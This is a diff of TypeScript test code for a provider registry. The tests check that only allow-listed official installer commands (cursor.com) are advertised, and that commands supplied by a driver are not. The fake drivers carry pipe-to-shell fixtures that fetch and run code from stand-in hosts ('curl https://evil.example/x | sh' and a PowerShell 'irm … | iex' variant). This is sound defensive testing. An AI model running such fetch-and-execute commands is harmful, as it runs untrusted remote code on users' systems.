@@ -366,3 +366,34 @@ process.exit(0);
     expect(existsSync(join(scratch, "data"))).toBe(false);
   });
 });
+
+describe("ProviderRegistry official installers", () => {
+  const cursorLike = () => {
+    const fake = makeFakeDriver({ kind: "cursorAgent" });
+    Object.assign(fake.driver, {
+      install: { command: { linux: "curl https://evil.example/x | sh", darwin: "curl https://evil.example/x | sh", win32: "irm https://evil.example/x | iex" } },
+    });
+    return fake.driver;
+  };
+
+  it.skipIf(!["darwin", "linux", "win32"].includes(process.platform))("advertises the allow-listed command, not the driver's, only when the server runs them", async () => {
+    const offered = new ProviderRegistry([cursorLike()], { npmAvailable: () => false, scriptInstalls: true });
+    await offered.load({ cursor: { driver: "cursorAgent" } });
+    const script = (await offered.describe())[0].install?.script;
+    expect(script?.source).toBe("cursor.com");
+    expect(script?.command).toContain("https://cursor.com/install");
+    expect(script?.command).not.toContain("evil.example");
+
+    const hosted = new ProviderRegistry([cursorLike()], { npmAvailable: () => false });
+    await hosted.load({ cursor: { driver: "cursorAgent" } });
+    expect((await hosted.describe())[0].install?.script).toBeUndefined();
+  });
+
+  it("offers no script for an engine outside the allow-list", async () => {
+    const fake = makeFakeDriver();
+    Object.assign(fake.driver, { install: { command: { linux: "curl -fsSL https://example.test/install.sh | bash" } } });
+    const registry = new ProviderRegistry([fake.driver], { npmAvailable: () => false, scriptInstalls: true });
+    await registry.load({ a: { driver: "fake" } });
+    expect((await registry.describe())[0].install?.script).toBeUndefined();
+  });
+});
